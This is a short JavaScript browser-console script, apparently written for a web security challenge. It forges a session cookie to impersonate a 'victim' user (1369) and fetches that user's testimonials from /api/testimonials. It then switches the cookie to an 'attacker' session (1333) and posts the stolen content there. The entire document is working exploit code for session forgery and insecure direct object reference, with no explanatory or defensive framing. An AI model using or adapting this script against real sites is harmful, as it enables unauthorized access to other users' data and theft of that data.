(async function transferWithVictimAttacker() {
    
    console.log("🚀 Starting transfer from 1369 (Victim) to 1333 (Attacker)...");

    // ====================== 1. GET Victim Data (1369) ======================
    document.cookie = "session=1369; path=/";
    await new Promise(r => setTimeout(r, 500));

    let victimData = [];
    
    try {
        const res = await fetch('/api/testimonials', {
            method: 'GET',
            credentials: 'include'
        });

        if (res.ok) {
            victimData = await res.json();
            console.log("✅ Victim Data (1369) fetched:", victimData);
        }
    } catch (e) {
        console.error("Failed to fetch victim data", e);
    }

    // ====================== 2. Prepare Combined Content ======================
    let victimContent = "";

    if (Array.isArray(victimData) && victimData.length > 0) {
        victimContent = victimData
            .map(item => {
                if (typeof item === 'string') return item;
                if (item && item.content) return item.content;
                return JSON.stringify(item);
            })
            .join(" | ");
    } else if (victimData && victimData.content) {
        victimContent = victimData.content;
    }

    // Attacker's own previous data (you can change this)
    const attackerPreviousData = "This is what attacker already posted before";

    // Final formatted content
    const finalContent = `=== VICTIM DATA ===
${victimContent || "No victim data found"}

=== ATTACKER DATA ===
${attackerPreviousData}

=== SEPARATOR ===
`;

    console.log("\n📋 Final Content to be posted to 1333:\n");
    console.log(finalContent);

    // ====================== 3. POST to Attacker Session (1333) ======================
    document.cookie = "session=1333; path=/";
    await new Promise(r => setTimeout(r, 600));

    console.log("📤 Posting combined Victim + Attacker data to session=1333...");

    await fetch('/api/testimonials', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Accept': '*/*'
        },
        credentials: 'include',
        body: JSON.stringify({ 
            content: finalContent 
        })
    })
    .then(r => {
        console.log("POST Status:", r.status);
        return r.text();
    })
    .then(text => console.log("POST Response:", text))
    .catch(err => console.error("POST Error:", err));

    console.log("✅ Transfer Completed!");

})();
